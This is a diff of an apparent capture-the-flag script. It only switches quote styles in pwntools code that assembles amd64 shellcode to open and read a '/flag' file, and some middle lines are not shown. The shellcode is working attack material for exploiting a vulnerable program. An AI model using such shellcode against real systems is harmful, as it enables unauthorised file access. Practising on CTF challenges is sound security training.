@@ -1,11 +1,11 @@
 from pwn import *
 
-context.arch = 'amd64'
+context.arch = "amd64"
 
-'''
+"""
 H(0x48) prefix for back compatible with i386, but there are exception instructions: `push` and `pop`
-'''
-sc_bytes = asm('''
+"""
+sc_bytes = asm("""
 lea edi, [rip + flag]
 push 2                          # SYS_open
 pop rax
@@ -25,4 +25,4 @@ cdq                             # rdx = 0
 syscall
 flag:
     .asciz "/flag"
-''')
+""")
